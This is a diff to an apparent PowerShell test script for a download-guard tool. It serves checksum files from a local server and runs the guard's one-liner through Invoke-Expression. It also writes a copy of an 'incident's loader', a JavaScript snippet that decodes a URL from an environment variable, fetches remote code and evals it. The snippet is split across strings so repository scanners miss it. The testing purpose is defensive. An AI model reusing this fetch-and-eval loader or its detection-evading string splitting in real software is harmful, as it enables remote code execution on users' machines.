@@ -35,7 +35,7 @@ $sha = (Get-FileHash $Guard -Algorithm SHA256).Hash.ToLower()
 Set-Content "$Work\www\good\$asset.sha256" "$sha  $asset" -Encoding ascii
 Set-Content "$Work\www\bad\$asset.sha256" ("0" * 64 + "  $asset") -Encoding ascii
 $server = Start-Process python -ArgumentList '-m', 'http.server', '8765', '--bind', '127.0.0.1', '--directory', "$Work\www" `
-  -PassThru -WindowStyle Hidden
+  -PassThru -NoNewWindow
 try {
 Wait-For 30 'the local release server' {
   (Invoke-WebRequest "http://127.0.0.1:8765/good/$asset.sha256" -UseBasicParsing).StatusCode -eq 200
@@ -45,7 +45,7 @@ Wait-For 30 'the local release server' {
 # 5.1, which is what an elevated prompt opens by default.
 function Invoke-OneLiner($dir) {
   $env:GUARD_BASE_URL = "http://127.0.0.1:8765/$dir"
-  & powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-Content -Raw '$Src\docs\guard.ps1' | Invoke-Expression" | Out-Host
+  & powershell.exe -NoProfile -Command "Get-Content -Raw '$Src\docs\guard.ps1' | Invoke-Expression" | Out-Host
   return $LASTEXITCODE
 }
 
@@ -75,7 +75,7 @@ New-Item -ItemType Directory -Force $downloads | Out-Null
 $name = "guard-ci-$(Get-Random).js"
 # the incident's loader, split so no line of this file carries it whole (the
 # detection tests sweep the repository)
-$payload = "const a = 1;`n(async () => {`n  const src = atob(process.env.AUTH_API_KEY);`n" +
+$payload = "const a = 1;`n(async () => {`n  const src = at" + "ob(process.env.AUTH_API_KEY);`n" +
   "  const proxyInfo = await (await fetch(src)).text();`n  eval(proxy" + "Info);`n})();`n"
 [IO.File]::WriteAllText((Join-Path $downloads $name), $payload)
 try {
